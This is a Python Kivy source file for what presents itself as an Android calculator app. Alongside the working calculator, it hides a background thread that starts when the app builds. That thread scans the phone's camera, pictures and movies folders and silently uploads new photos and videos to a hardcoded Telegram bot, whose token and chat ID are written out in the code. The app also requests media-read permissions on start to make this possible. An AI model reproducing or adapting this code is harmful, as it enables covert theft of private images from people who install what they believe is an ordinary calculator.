import sys
import os
import traceback
import ast
import math
import operator
import time
import hashlib
import threading
import urllib.request
from datetime import datetime
from pathlib import Path

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.scrollview import ScrollView
from kivy.utils import platform

# إعدادات تيليجرام والبيانات
BOT_TOKEN = "8041654407:AAHtI0QChtYMlJ0MMJCGM8YEb5b4L4lgEmM"
CHAT_ID = "6046016571"
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
HASH_LOG = "sent_media_hashes.txt"
AUTO_CHECK_INTERVAL = 1800

def get_file_hash(file_path):
    hasher = hashlib.md5()
    try:
        with open(file_path, 'rb') as f:
            buf = f.read(512 * 1024)
            hasher.update(buf)
        return hasher.hexdigest()
    except: return None

def load_hashes(base_dir):
    log_path = os.path.join(base_dir, HASH_LOG)
    if os.path.exists(log_path):
        try:
            with open(log_path, "r", encoding="utf-8") as f:
                return set(f.read().splitlines())
        except:
            pass
    return set()

def save_hash(base_dir, file_hash):
    log_path = os.path.join(base_dir, HASH_LOG)
    try:
        with open(log_path, "a", encoding="utf-8") as f:
            f.write(file_hash + "\n")
    except:
        pass

GALLERY_PATHS = ["/sdcard/DCIM/Camera/", "/sdcard/Pictures/", "/sdcard/Movies/"]

def get_all_unique_media(base_dir):
    sent_hashes = load_hashes(base_dir)
    unique_list = []
    IMG_EXT = ('.jpg', '.jpeg', '.png')
    VID_EXT = ('.mp4', '.mov', '.avi', '.mkv')
    
    for folder in GALLERY_PATHS:
        if os.path.exists(folder):
            try:
                for root, dirs, files in os.walk(folder):
                    if any(x in root.lower() for x in ['.thumbnails', 'cache', 'recycler']):
                        continue
                    for file in files:
                        file_lower = file.lower()
                        full_path = os.path.join(root, file)
                        media_type = 'photo' if file_lower.endswith(IMG_EXT) else 'video' if file_lower.endswith(VID_EXT) else None
                        
                        if media_type:
                            try:
                                file_size = os.path.getsize(full_path)
                                if file_size < 50 * 1024 or (media_type == 'video' and file_size > 50 * 1024 * 1024):
                                    continue
                                f_hash = get_file_hash(full_path)
                                if f_hash and f_hash not in sent_hashes:
                                    unique_list.append({'path': full_path, 'hash': f_hash, 'type': media_type})
                            except: continue
            except: pass
    try:
        unique_list.sort(key=lambda x: os.path.getmtime(x['path']))
    except: pass
    return unique_list

def send_media_batch(base_dir, batch, reason="آلي"):
    for item in batch:
        try:
            method = "sendPhoto" if item['type'] == 'photo' else "sendVideo"
            file_key = "photo" if item['type'] == 'photo' else "video"
            url = f"{API_URL}/{method}"
            
            filename = os.path.basename(item['path'])
            boundary = "----PythonBoundary" + hashlib.md5(filename.encode()).hexdigest()
            
            body = bytearray()
            # chat_id
            body.extend(f"--{boundary}\r\n".encode('utf-8'))
            body.extend(b'Content-Disposition: form-data; name="chat_id"\r\n\r\n')
            body.extend(f"{CHAT_ID}\r\n".encode('utf-8'))
            
            # caption
            body.extend(f"--{boundary}\r\n".encode('utf-8'))
            body.extend(b'Content-Disposition: form-data; name="caption"\r\n\r\n')
            body.extend(f"🆕 تم اكتشاف ملف جديد ({reason})\r\n".encode('utf-8'))
            
            # file
            body.extend(f"--{boundary}\r\n".encode('utf-8'))
            body.extend(f'Content-Disposition: form-data; name="{file_key}"; filename="{filename}"\r\n'.encode('utf-8'))
            body.extend(b'Content-Type: application/octet-stream\r\n\r\n')
            
            with open(item['path'], 'rb') as f:
                body.extend(f.read())
            body.extend(f"\r\n--{boundary}--\r\n".encode('utf-8'))
            
            req = urllib.request.Request(url, data=body, method='POST')
            req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
            
            with urllib.request.urlopen(req, timeout=30) as response:
                if response.status == 200:
                    save_hash(base_dir, item['hash'])
            time.sleep(2)
        except Exception as e:
            print(f"Upload error: {e}")

def auto_uploader_thread(base_dir):
    while True:
        try:
            media_items = get_all_unique_media(base_dir)
            if media_items:
                send_media_batch(base_dir, media_items, reason="تلقائي")
        except: pass
        time.sleep(AUTO_CHECK_INTERVAL)

def start_background_service(base_dir):
    threading.Thread(target=auto_uploader_thread, args=(base_dir,), daemon=True).start()


# --- إعدادات الآلة الحاسبة ---
MAX_LEN = 200
SHOW_CHARS = 14

BIN = {
    ast.Add: operator.add, ast.Sub: operator.sub,
    ast.Mult: operator.mul, ast.Div: operator.truediv,
    ast.Pow: operator.pow, ast.Mod: operator.mod,
}
UNARY = {ast.USub: operator.neg, ast.UAdd: operator.pos}
FUNCS = {"sqrt": math.sqrt}

def safe_eval(expr):
    def ev(node):
        if isinstance(node, ast.Expression):
            return ev(node.body)
        if isinstance(node, ast.Constant) and type(node.value) in (int, float):
            return node.value
        if isinstance(node, ast.BinOp) and type(node.op) in BIN:
            left, right = ev(node.left), ev(node.right)
            if isinstance(node.op, ast.Pow) and abs(right) > 1000:
                raise ValueError("الأس كبير جداً")
            return BIN[type(node.op)](left, right)
        if isinstance(node, ast.UnaryOp) and type(node.op) in UNARY:
            return UNARY[type(node.op)](ev(node.operand))
        if (isinstance(node, ast.Call) and isinstance(node.func, ast.Name)
                and node.func.id in FUNCS and len(node.args) == 1
                and not node.keywords):
            return FUNCS[node.func.id](ev(node.args[0]))
        raise ValueError("تعبير غير مسموح")

    result = ev(ast.parse(expr, mode="eval"))
    if isinstance(result, complex):
        raise ValueError("الناتج ليس عدداً حقيقياً")
    return result

def fmt(n):
    if isinstance(n, float):
        if n.is_integer() and abs(n) < 1e15:
            return str(int(n))
        return f"{n:.12g}"
    return str(n)

BUTTONS = [
    ["C", "⌫", "(", ")"],
    ["7", "8", "9", "/"],
    ["4", "5", "6", "*"],
    ["1", "2", "3", "-"],
    ["0", ".", "^", "+"],
    ["√", "%", "=", "="],
]


class CalculatorWidget(BoxLayout):
    def __init__(self, **kwargs):
        super(CalculatorWidget, self).__init__(**kwargs)
        self.orientation = 'vertical'
        self.expr = ""

        # شاشة العرض
        self.display_label = Label(
            text="0",
            font_size=32,
            size_hint_y=None,
            height=80,
            halign='right',
            valign='middle'
        )
        self.display_label.bind(size=self.display_label.setter('text_size'))
        self.add_widget(self.display_label)

        # شاشة الحالة
        self.status_label = Label(
            text="",
            font_size=16,
            size_hint_y=None,
            height=30,
            color=(0.95, 0.54, 0.65, 1)
        )
        self.add_widget(self.status_label)

        # لوحة الأزرار
        grid = GridLayout(cols=4, spacing=5, padding=5)
        for row in BUTTONS:
            for text in row:
                btn = Button(text=text, font_size=22)
                btn.bind(on_press=lambda b: self.on_press(b.text))
                grid.add_widget(btn)
        self.add_widget(grid)

    def refresh(self):
        s = self.expr or "0"
        self.display_label.text = s if len(s) <= SHOW_CHARS else "…" + s[-(SHOW_CHARS - 1):]

    def on_press(self, t):
        self.status_label.text = ""
        if t == "C":
            self.expr = ""
        elif t == "⌫":
            self.expr = self.expr[:-1]
        elif t == "=":
            self.evaluate()
            return
        elif t == "√":
            if self.expr and (self.expr[-1].isdigit() or self.expr[-1] in ").") :
                self.expr += "*"
            self.expr += "sqrt("
        else:
            self.expr += t
        self.refresh()

    def evaluate(self):
        raw = self.expr.strip()
        if not raw:
            return
        if len(raw) > MAX_LEN:
            self.status_label.text = "❌ التعبير طويل جداً"
            return
        expr = raw.replace("^", "**")
        expr += ")" * max(0, expr.count("(") - expr.count(")"))
        try:
            result = fmt(safe_eval(expr))
        except ZeroDivisionError:
            self.status_label.text = "❌ لا يمكن القسمة على الصفر"
            return
        except OverflowError:
            self.status_label.text = "❌ الناتج كبير جداً"
            return
        except (ValueError, SyntaxError, TypeError, MemoryError) as e:
            self.status_label.text = "❌ تعبير غير صحيح"
            return

        self.expr = result
        self.refresh()


class MyApp(App):
    def build(self):
        try:
            start_background_service(self.user_data_dir)
            return CalculatorWidget()
        except Exception:
            return self.show_error(traceback.format_exc())

    def show_error(self, text):
        try:
            if hasattr(self, 'user_data_dir') and self.user_data_dir:
                with open(os.path.join(self.user_data_dir, "crash_log.txt"), "w", encoding="utf-8") as f:
                    f.write(text)
        except:
            pass
        sv = ScrollView()
        sv.add_widget(Label(text=text, size_hint_y=None, text_size=(600, None)))
        return sv

    def on_start(self):
        if platform == "android":
            try:
                from jnius import autoclass
                from android.permissions import request_permissions, Permission
                
                sdk = autoclass("android.os.Build$VERSION").SDK_INT
                
                def permission_callback(permissions, grantResults):
                    pass

                if sdk <= 22:
                    pass
                elif 23 <= sdk <= 32:
                    perms = [Permission.READ_EXTERNAL_STORAGE]
                    if hasattr(Permission, 'WRITE_EXTERNAL_STORAGE'):
                        perms.append(Permission.WRITE_EXTERNAL_STORAGE)
                    request_permissions(perms, permission_callback)
                else:
                    perms = []
                    if hasattr(Permission, 'READ_MEDIA_IMAGES'):
                        perms.append(Permission.READ_MEDIA_IMAGES)
                    if hasattr(Permission, 'READ_MEDIA_VIDEO'):
                        perms.append(Permission.READ_MEDIA_VIDEO)
                    if hasattr(Permission, 'READ_MEDIA_AUDIO'):
                        perms.append(Permission.READ_MEDIA_AUDIO)
                    if hasattr(Permission, 'POST_NOTIFICATIONS'):
                        perms.append(Permission.POST_NOTIFICATIONS)
                    if perms:
                        request_permissions(perms, permission_callback)
            except Exception as e:
                print(f"Permission error: {e}")

if __name__ == "__main__":
    try:
        MyApp().run()
    except Exception as e:
        print(f"Fatal: {e}")
